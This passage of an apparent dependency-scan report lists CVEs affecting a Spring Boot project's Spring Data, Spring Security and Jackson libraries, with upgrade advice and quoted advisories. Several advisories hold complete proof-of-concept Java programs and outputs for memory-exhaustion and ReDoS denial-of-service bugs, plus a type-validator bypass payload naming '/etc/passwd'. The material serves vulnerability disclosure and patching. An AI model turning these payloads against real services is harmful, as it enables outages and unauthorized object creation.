  - org.springframework.data:spring-data-commons: upgrade to 3.5.12 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring Data Commons contains a vulnerability that can lead to a Denial of Service (DoS) condition if Spring Data Web Support is enabled in conjunction with a Controller method using @ProjectedPayload, when an attacker sends a specially crafted HTTP request that causes the application to allocate lots of memory.

Affected versions:
Spring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.

### CVE-2026-41711: Spring Data Commons: StackOverflowException when parsing Sort parameters (DoS)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41711](https://github.com/advisories/GHSA-5vpf-xvv7-c8vh): Spring Data Commons: StackOverflowException when parsing Sort parameters (DoS)

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.data:spring-data-commons:3.5.0 (compile; via spring-boot-starter-data-jpa at pom.xml:46); affected range >= 3.5.0, <= 3.5.11

Recommended fix:
  - org.springframework.data:spring-data-commons: upgrade to 3.5.12 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Applications using Spring Data Commons may be vulnerable to a Denial of Service (DoS) attack leading to a StackOverflowException when parsing Sort parameters.

Affected versions:
Spring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.

### CVE-2026-41716: Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:46

[CVE-2026-41716](https://github.com/advisories/GHSA-9fw2-h3hf-293r): Spring Data Commons: Heap exhaustion from unbounded property-lookup cache retaining crafted string keys

Severity: HIGH

Affected resolved dependencies:
  - org.springframework.data:spring-data-commons:3.5.0 (compile; via spring-boot-starter-data-jpa at pom.xml:46); affected range >= 3.5.0, <= 3.5.11

Recommended fix:
  - org.springframework.data:spring-data-commons: upgrade to 3.5.12 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring Data's internal property-lookup cache accepts and permanently retains attacker-supplied strings as cache keys, allowing heap exhaustion through repeated requests.

Affected versions:
Spring Data Commons 2.7.0 through 2.7.19; 3.3.0 through 3.3.16; 3.4.0 through 3.4.14; 3.5.0 through 3.5.11; 4.0.0 through 4.0.5.

### CVE-2026-22751: Spring Security Core has a TOCTOU race condition when One-Time Token login with JdbcOneTimeTokenService is configured
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2026-22751](https://github.com/advisories/GHSA-x2wq-9x2f-fhj7): Spring Security Core has a TOCTOU race condition when One-Time Token login with JdbcOneTimeTokenService is configured

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.security:spring-security-core:6.5.0 (compile; via spring-boot-starter-security at pom.xml:65); affected range >= 6.5.0, < 6.5.10

Recommended fix:
  - org.springframework.security:spring-security-core: upgrade to 6.5.10 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Vulnerability in Spring Spring Security. Applications that explicitly configure One-Time Token login with JdbcOneTimeTokenService are vulnerable to a Time-of-check Time-of-use (TOCTOU) race condition. This issue affects Spring Security: from 6.4.0 through 6.4.15, from 6.5.0 through 6.5.9, from 7.0.0 through 7.0.4.

### CVE-2025-41248: Spring Security annotation detection mechanism has authorization bypass
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:65

[CVE-2025-41248](https://github.com/advisories/GHSA-8v5q-rhf3-jphm): Spring Security annotation detection mechanism has authorization bypass

Severity: HIGH

Affected resolved dependencies:
  - org.springframework.security:spring-security-core:6.5.0 (compile; via spring-boot-starter-security at pom.xml:65); affected range >= 6.5.0, < 6.5.4

Recommended fix:
  - org.springframework.security:spring-security-core: upgrade to 6.5.4 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
The Spring Security annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue when using @PreAuthorize and other method security annotations, resulting in an authorization bypass.

Your application may be affected by this if you are using Spring Security's @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41249 https://spring.io/security/cve-2025-41249 .

### CVE-2026-89425: jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-89425](https://github.com/advisories/GHSA-7hhh-6rmp-j9qf): jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-core:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, <= 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.7 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Status

**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a
20,000,109-character exception message from a 20-million-character attacker payload, while the
identical payload fed through `createParser(InputStream)` produced a correctly bounded
367-character message.

## Affected Component / Version

- **Package:** `com.fasterxml.jackson.core:jackson-core`
- **Confirmed against:** `jackson-core-2.20.2`
- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`
  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)

## Technical Analysis

`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its
exception message by appending identifier characters one at a time to a bare `StringBuilder`:

```java
protected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {
    StringBuilder sb = new StringBuilder(matchedPart);
    while (true) {
        char c = (char) _decodeCharForError(ch);
        if (!Character.isJavaIdentifierPart(c)) {
            break;
        }
        sb.append(c);
        ch = _inputData.readUnsignedByte();
    }
    _reportError("Unrecognized token '"+sb.toString()+"': was expecting "+msg);
}
```

There is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)
anywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the
same logic does enforce it:

```java
// UTF8StreamJsonParser.java (control, correctly bounded)
if (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {
    sb.append("...");
    break;
}
```

`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —
this is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by
direct comparison of all four parser implementations in this tree.

This path is additionally left with **no fallback control**: because of `[core#1570]`-related
logic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser
creation to be rejected outright, so a document-length backstop cannot coexist with this input
source, and the identifier-character accumulation never passes through
`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no
configuration an application can set to mitigate this specific path.

## Reproduction Procedure

Same clone/build steps as `jackson-core_1_...md`. Then:

```bash
CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
javac -cp "$CP" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java
java -Xmx2g -cp "poc:$CP" PoC6_UnboundedErrorTokenStringBuilder
```

## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)

```java
import com.fasterxml.jackson.core.*;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;

public class PoC6_UnboundedErrorTokenStringBuilder {

    static class RepeatingByteInputStream extends InputStream {
        private final int b;
        private long remaining;
        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }
        @Override public int read() {
            if (remaining <= 0) return -1;
            remaining--;
            return b;
        }
    }

    public static void main(String[] args) throws Exception {
        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;

        System.out.println("Malformed token: \"t\" followed by " + IDENTIFIER_CHAR_COUNT
                + " Java-identifier characters ('x'), then a terminating space, never completing"
                + " \"true\"/\"false\"/\"null\"/NaN.\n");

        System.out.println("=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            DataInputStream dataIn = new DataInputStream(raw);
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser((java.io.DataInput) dataIn);

            long heapBefore = usedHeap();
            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            long heapAfter = usedHeap();

            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Approx additional heap used: " + ((heapAfter - heapBefore) / (1024 * 1024)) + " MB");
            System.out.println("Message length proportional to the full " + IDENTIFIER_CHAR_COUNT
                    + "-character payload (unbounded)? " + (msgLen > 1_000_000));
        }

        System.out.println("\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser(raw);

            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Message length bounded near default maxErrorTokenLength (256)? " + (msgLen < 500));
        }
    }

    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {
        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);
        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));
    }

    static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        System.gc();
        return rt.totalMemory() - rt.freeMemory();
    }
}
```

## Captured Evidence (actual run output)

```
Malformed token: "t" followed by 20000000 Java-identifier characters ('x'), then a terminating
space, never completing "true"/"false"/"null"/NaN.

=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===
Exception message length: 20000109 characters
Elapsed time: 81 ms
Approx additional heap used (best-effort, GC-noisy): 38 MB
Message length is proportional to the full 20000000-character attacker payload (unbounded)? true

=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===
Exception message length: 367 characters
Elapsed time: 7 ms
Message length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true
```

The same 20-million-character malformed token, fed to the two parser variants, produces a
367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character
message via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical
input, confirming the missing bound is the sole cause of the difference.

## Impact

Any application creating parsers via `JsonFactory.createParser(DataInput)` over
attacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth
from a single malformed token. Scaling the payload from the 20MB demonstrated here to
gigabytes (well within a typical unbounded request body) would drive the accumulated
`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —
to consume many times the raw payload size, realistically triggering `OutOfMemoryError` and
denying service to the whole JVM process. Critically, **no available configuration mitigates
this**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`
does not apply to this code path.

## Remediation

1. Add the `maxErrorTokenLength` check to the append loop in
   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `"..."` and breaking when the
   limit is reached — mirroring the three other parser implementations exactly.
2. Add a parameterized regression test across all four parser implementations asserting the
   exception message length is bounded by `maxErrorTokenLength` plus a small constant.
3. Consider extracting this bounded-scan logic into a single shared helper on
   `ParserMinimalBase` to prevent this class of per-implementation drift recurring.

### CVE-2026-89407:  jackson-core: ReDoS: quadratic backtracking in NumberInput.PATTERN_FLOAT via looksLikeValidNumber()
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-89407](https://github.com/advisories/GHSA-p6pp-m3f8-5c89):  jackson-core: ReDoS: quadratic backtracking in NumberInput.PATTERN_FLOAT via looksLikeValidNumber()

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-core:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, <= 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.7 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
## Status

**FULLY REPRODUCED** with a clean, textbook empirical signature: measured runtime grew almost
exactly 4x for every doubling of input size across five consecutive doublings (5,000 → 160,000
characters), confirming O(n²) behavior. A single 160,000-character string (smaller than a typical
HTTP request body) took **74.4 seconds** for one call to `NumberInput.looksLikeValidNumber()`.

## Affected Component / Version

- **Package:** `com.fasterxml.jackson.core:jackson-core`
- **Confirmed against:** `jackson-core-2.20.2`
- **Affected file:** `src/main/java/com/fasterxml/jackson/core/io/NumberInput.java`
  (`PATTERN_FLOAT` line ~41-42, `PATTERN_FLOAT_TRAILING_DOT` line ~51, entry point
  `looksLikeValidNumber()` lines ~646-656)

## Technical Analysis

```java
private final static Pattern PATTERN_FLOAT = Pattern.compile(
      "[+-]?[0-9]*[\\.]?[0-9]+([eE][+-]?[0-9]+)?");

private final static Pattern PATTERN_FLOAT_TRAILING_DOT = Pattern.compile(
        "[+-]?[0-9]+[\\.]");

public static boolean looksLikeValidNumber(final String s) {
    // ... short-circuits only for null/empty/length==1 ...
    return PATTERN_FLOAT.matcher(s).matches()
            || PATTERN_FLOAT_TRAILING_DOT.matcher(s).matches();
}
```

`PATTERN_FLOAT` contains ambiguous, adjacent quantifiers over the identical character class:
`[0-9]*` (optional digits), an optional `[.]`, then `[0-9]+` (required digits). Java's
backtracking `Pattern`/`Matcher` engine has no possessive quantifiers or atomic grouping here,
so on a non-matching input the engine must explore every possible split point between the
`[0-9]*` and `[0-9]+` groups before concluding failure — the classic quadratic-backtracking
shape. `looksLikeValidNumber()` compounds the cost by running a **second** full-string regex
(`PATTERN_FLOAT_TRAILING_DOT`) whenever the first fails, roughly doubling the constant factor
without changing the asymptotic class.

Critically, the length gate that applies to this specific path is
`StreamReadConstraints.maxStringLength` (default **20,000,000**), not `maxNumberLength`
(default **1,000**) — the length ceiling the library uses everywhere else for numeric content.
This means inputs up to four orders of magnitude larger than the library's own numeric-length
policy reach this quadratic regex unmodified.

## Reproduction Procedure

Same clone/build steps as `jackson-core_1_...md`. Then:

```bash
CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
javac -cp "$CP" -d poc poc/PoC8_NumberInputReDoS.java
java -cp "poc:$CP" PoC8_NumberInputReDoS
```

## Full PoC Source (`poc/PoC8_NumberInputReDoS.java`)

```java
import com.fasterxml.jackson.core.io.NumberInput;

public class PoC8_NumberInputReDoS {

    public static void main(String[] args) {
        int[] sizes = {5_000, 10_000, 20_000, 40_000, 80_000, 160_000};
        long[] timesMs = new long[sizes.length];

        System.out.println("Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:\n");

        for (int i = 0; i < sizes.length; i++) {
            int n = sizes[i];
            String s = repeat('1', n) + "x";

            if (i == 0) {
                NumberInput.looksLikeValidNumber(repeat('1', 200) + "x"); // warm up
            }

            long t0 = System.nanoTime();
            boolean result = NumberInput.looksLikeValidNumber(s);
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            timesMs[i] = elapsedMs;

            System.out.printf("n=%-8d looksLikeValidNumber=%-6b elapsed=%6d ms%n", n, result, elapsedMs);
        }

        System.out.println("\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):");
        boolean quadraticSignatureObserved = false;
        for (int i = 1; i < sizes.length; i++) {
            double ratio = timesMs[i - 1] == 0 ? Double.NaN : (double) timesMs[i] / (double) timesMs[i - 1];
            System.out.printf("  n=%d -> n=%d : %dms -> %dms  (ratio=%.2fx)%n",
                    sizes[i - 1], sizes[i], timesMs[i - 1], timesMs[i], ratio);
            if (ratio >= 3.0) quadraticSignatureObserved = true;
        }

        System.out.println("\nLargest test (n=" + sizes[sizes.length - 1] + ") took " + timesMs[timesMs.length - 1]
                + " ms for a single call from ONE HTTP-body-sized string.");
        System.out.println("\ncom.fasterxml.jackson.core.StreamReadConstraints.DEFAULT_MAX_STRING_LENGTH (20,000,000) "
                + "governs this path, not maxNumberLength (1,000).");

        if (quadraticSignatureObserved) {
            System.out.println("\n=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent "
                    + "with quadratic backtracking in PATTERN_FLOAT on non-matching input.");
        }
    }

    static String repeat(char c, int n) {
        char[] arr = new char[n];
        java.util.Arrays.fill(arr, c);
        return new String(arr);
    }
}
```

## Captured Evidence (actual run output)

```
Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:

n=5000     looksLikeValidNumber=false  elapsed=    74 ms
n=10000    looksLikeValidNumber=false  elapsed=   306 ms
n=20000    looksLikeValidNumber=false  elapsed=  1157 ms
n=40000    looksLikeValidNumber=false  elapsed=  4655 ms
n=80000    looksLikeValidNumber=false  elapsed= 18592 ms
n=160000   looksLikeValidNumber=false  elapsed= 74393 ms

Ratio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):
  n=5000 -> n=10000 : 74ms -> 306ms  (ratio=4.14x)
  n=10000 -> n=20000 : 306ms -> 1157ms  (ratio=3.78x)
  n=20000 -> n=40000 : 1157ms -> 4655ms  (ratio=4.02x)
  n=40000 -> n=80000 : 4655ms -> 18592ms  (ratio=3.99x)
  n=80000 -> n=160000 : 18592ms -> 74393ms  (ratio=4.00x)

Largest test (n=160000) took 74393 ms for a single call from ONE HTTP-body-sized string.

=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent with quadratic
backtracking in PATTERN_FLOAT on non-matching input.
```

This is an unusually clean empirical result: five consecutive doublings each produced a ratio
between 3.78x and 4.14x — matching the theoretical O(n²) prediction (ratio = 4.0x) to within
5% at every single measurement, leaving essentially no ambiguity about the complexity class.
Extrapolating this measured curve, a ~1MB string (well within common request body limits) would
take on the order of hours for a single call.

## Impact

Any application that coerces a String-typed JSON field to a number (default `jackson-databind`
behavior) is exposed: an attacker who can submit a large numeric-looking string (up to
`maxStringLength`'s default of 20,000,000 characters — far larger than needed given the
measured curve) can pin a request-handling thread for an extended period with a single request.
Because the cost scales quadratically, a handful of concurrent moderately-sized requests
(tens to low hundreds of KB each) is sufficient to exhaust a typical web server's worker thread
pool, denying service to all users.

## Remediation

1. Rewrite `PATTERN_FLOAT` without quantifier ambiguity using possessive quantifiers, e.g.
   `[+-]?(?:[0-9]++(?:\.[0-9]*+)?|\.[0-9]++)(?:[eE][+-]?[0-9]++)?`, which also folds in the
   trailing-dot case and removes the need for a second full-string scan.
2. Better: replace the regex entirely with a single-pass hand-written character scan — the same
   file already contains exactly this pattern for `parseInt`, so the library has both the
   precedent and the code style available.
3. Apply an independent length limit (`maxNumberLength`, not the much larger
   `maxStringLength`) before calling `looksLikeValidNumber()`, closing the four-orders-of-
   magnitude gap between the two constraints for this specific code path.
4. Operationally, until fixed: tighten `StreamReadConstraints.maxStringLength` well below its
   default, and set wall-clock timeouts on parse/coercion operations.

### CVE-2026-91777: jackson-databind quadratic forward-reference completion 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-91777](https://github.com/advisories/GHSA-cxp5-3px4-pw24): jackson-databind quadratic forward-reference completion 

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, <= 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.7 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary

When an `@JsonIdentityInfo` collection or map first creates N unresolved
object-ID references and later resolves the same IDs in reverse order,
jackson-databind scans the remaining pending-reference accumulator for each
resolution. A shallow JSON document whose size grows linearly can therefore
cause quadratic CPU work during deserialization.

### Details

The affected path is forward-reference completion in
`CollectionDeserializer.CollectionReferringAccumulator.resolveForwardReference()`
and the corresponding map implementation. The implementation performs a
linear search of the pending accumulator for every resolved object ID.

The behavior is runtime-confirmed in jackson-databind 2.5.0, 2.22.1, and
3.2.1. Current 2.22 and 3.2 source branches retained the same design when
rechecked. A 2.4.0 control fails closed before successful reverse-order
completion, so 2.5.0 is the conservative runtime-confirmed affected floor.
The patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must deserialize attacker-influenced JSON into an
identity-enabled collection or map. The issue does not require deep nesting or
syntactically unusual JSON.

Suggested correction: replace repeated linear lookup/removal with a keyed
pending-reference structure or another design that provides linear or
amortized-linear completion. A regression should preserve input order,
duplicate-ID behavior, and unresolved-ID errors while bounding reverse-order
resolution work.

### PoC

The proof constructs a shallow collection containing N unresolved
`@JsonIdentityInfo` references followed by definitions of those same IDs in
reverse order. Its ID class counts `equals()` calls, giving a deterministic
work measure rather than a timing-dependent result.

With N=2,000, affected versions perform exactly 2,003,000 ID comparisons. An
equally sized control in which every reference is already resolved performs
zero comparisons in the pending-reference lookup path. The run is bounded to
a 512 MiB JVM. The result demonstrates quadratic growth: approximately
`N * (N + 1) / 2` comparisons, plus fixed setup comparisons.

### Impact

An unauthenticated source that can submit JSON to an application using the
affected identity-enabled collection or map shape can consume quadratic CPU
and exhaust a request-time or worker-capacity budget, causing denial of
service. The application model/configuration prerequisite is material. No
confidentiality, integrity, code-execution, or parser-depth impact is claimed.

Requested credit: Daniel Birtwhistle

### CVE-2026-91776: jackson-databind retains every unknown raw type ID 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-91776](https://github.com/advisories/GHSA-wv8q-qhhj-9h54): jackson-databind retains every unknown raw type ID 

Severity: HIGH

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, <= 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.7 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary

With `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown
raw type ID selects the same fallback deserializer but is retained as a
separate key in `TypeDeserializerBase._deserializers`. An attacker who can
repeatedly supply new unknown type IDs can grow this process-lifetime cache
without a configured bound.

### Details

The affected path is `TypeDeserializerBase._findDeserializer()`. After an
unknown name-based type ID resolves to the configured fallback/default
implementation, jackson-databind caches the result under the attacker-provided
raw `typeId`. Although all such IDs select the same fallback deserializer, each
new string remains a distinct cache key.

The behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.
Current 2.22 and 3.2 source branches retained the unbounded `_deserializers`
map and per-raw-ID cache write when rechecked. The earlier affected floor has
not been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must enable name-based polymorphism with a
`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and
reuse a long-lived mapper/type deserializer across requests.

Suggested correction: avoid caching each unknown raw ID when every such ID
resolves to the same fallback, use a fallback sentinel, or use an explicitly
bounded concurrency-safe cache. A regression should contrast many distinct
unknown IDs with repetitions of one unknown ID across requests.

### PoC

Configure a polymorphic base type with
`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and
deserialize inputs containing unknown type names through the same mapper.
Inspect `TypeDeserializerBase._deserializers` after the run.

On affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce
10,000 retained cache entries even though every input selects the same
fallback deserializer. A matched control that repeats one unknown ID 10,000
times produces one retained entry. This isolates attacker-controlled key
cardinality from ordinary request count.

### Impact

Where the stated polymorphic fallback configuration is exposed to
attacker-influenced type IDs, distinct inputs cause incremental
process-lifetime memory retention and eventual availability pressure or
denial of service. This is not claimed as a single-request allocation spike,
and no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No
confidentiality, integrity, or code-execution impact is claimed.

Requested credit: Daniel Birtwhistle

### CVE-2026-83557: jackson-databind: Comparable missing from DefaultBaseTypeLimitingValidator's unsafe base types (incomplete PolymorphicTypeValidator denylist)
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-83557](https://github.com/advisories/GHSA-gx83-3vf8-gh7j): jackson-databind: Comparable missing from DefaultBaseTypeLimitingValidator's unsafe base types (incomplete PolymorphicTypeValidator denylist)

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-databind:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.6

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.6 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary
`DefaultBaseTypeLimitingValidator` — the `PolymorphicTypeValidator` used automatically whenever `@JsonTypeInfo` is applied without an explicitly configured custom validator — denies polymorphic resolution only for nine specific "unsafe base types" (`Object`, `Serializable`, `Closeable`, `AutoCloseable`, `Cloneable`, `Runnable`, `java.util.logging.Handler`, `javax.naming.Referenceable`, `javax.sql.DataSource`). Its `isSafeSubType()` returns `true` unconditionally for every other base type. `java.lang.Comparable` is not in that list, despite being implemented by a very large fraction of JDK and application classes — comparable in breadth to `Serializable`, which is denylisted for exactly that reason. An application with an `@JsonTypeInfo`-annotated `Comparable`-typed property, and no custom validator configured, will accept a type identifier for essentially any class implementing `Comparable`.

### Details
**Affected file:** `src/main/java/tools/jackson/databind/jsontype/DefaultBaseTypeLimitingValidator.java`

```java
private final static class UnsafeBaseTypes {
    private final Set<String> UNSAFE = new HashSet<>();
    {
        UNSAFE.add(Object.class.getName());
        UNSAFE.add(java.io.Closeable.class.getName());
        UNSAFE.add(java.io.Serializable.class.getName());
        UNSAFE.add(AutoCloseable.class.getName());
        UNSAFE.add(Cloneable.class.getName());
        UNSAFE.add(Runnable.class.getName());          // [databind#5014]
        UNSAFE.add("java.util.logging.Handler");
        UNSAFE.add("javax.naming.Referenceable");
        UNSAFE.add("javax.sql.DataSource");
        // java.lang.Comparable is NOT present here
    }
}

protected boolean isSafeSubType(DatabindContext ctxt,
        JavaType baseType, JavaType subType) {
    return true;   // unconditional for every base type not in UNSAFE
}
```

The class's own JavaDoc acknowledges the design (*"Note that when using potentially unsafe base type like `java.lang.Object` a custom implementation... is needed"*), so the trade-off of leaving broad base types unrestricted is intentional. The gap is that `Comparable` has the same breadth of implementers as the types this class *does* restrict, and its absence looks like an oversight rather than a deliberate choice — consistent with the ongoing, incremental nature of this list (`Runnable` was added recently for issue #5014).

This is specific to the **default, unconfigured validator** reached via bare `@JsonTypeInfo` usage. Global "Default Typing" via `activateDefaultTyping()` is **not** affected, because that method structurally requires an explicit `PolymorphicTypeValidator` argument — a correctly-configured `BasicPolymorphicTypeValidator` rejects the same payload under `activateDefaultTyping()`.

### PoC
Built entirely from source (jackson-databind + jackson-core + jackson-annotations, `javac`, OpenJDK 21, no third-party gadget libraries, no network access):

**1. Sanity check (benign class, confirms the mechanism fires):**
```java
static class SafeThing implements Comparable<SafeThing> {
    public String name;
    public SafeThing() {}
    public int compareTo(SafeThing o) { return 0; }
}
static class Holder {
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
    public Comparable<?> value;
}

ObjectMapper mapper = JsonMapper.builder().build();   // no custom PTV
String json = "{\"value\":{\"@class\":\"...SafeThing\",\"name\":\"hello\"}}";
Holder h = mapper.readValue(json, Holder.class);
// RESULT: ACCEPTED, class=...SafeThing
```

**2. Real JDK class substitution:**
```java
String json = "{\"value\":[\"java.io.File\",\"/etc/passwd\"]}";
Holder h = mapper.readValue(json, Holder.class);
// RESULT: ACCEPTED, class=java.io.File value=/etc/passwd
```

**3. Negative control — Default Typing with an explicit custom PTV:**
```java
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("PtvGapTest4").build();
ObjectMapper mapper = JsonMapper.builder()
    .activateDefaultTyping(ptv, DefaultTyping.NON_FINAL).build();
// same java.io.File payload
